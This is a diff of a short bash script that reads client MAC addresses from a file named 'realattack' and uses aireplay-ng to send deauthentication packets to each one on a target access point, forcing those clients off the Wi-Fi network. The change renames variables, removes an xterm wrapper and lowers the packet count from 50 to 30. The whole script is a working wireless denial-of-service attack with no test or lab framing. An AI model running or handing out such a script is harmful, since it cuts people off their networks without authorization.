@@ -1,15 +1,15 @@
 #!/bin/bash
 
 BSSID24="00:00:00:00:00:00"
-mon24ghz=adapter
+GHZ24=adapter
 
 
 
-for deauth in $(cat realattack5ghz); do
+for deauth in $(cat realattack); do
 if [[ $deauth = "< | HWaddress" ]]; then
 	echo ""
 else
-exec xterm -e sudo aireplay-ng --deauth 50 -a $BSSID24 -c $deauth $mon24ghz
+sudo aireplay-ng --deauth 30 -a $BSSID24 -c $deauth $GHZ24
 fi
 done
 
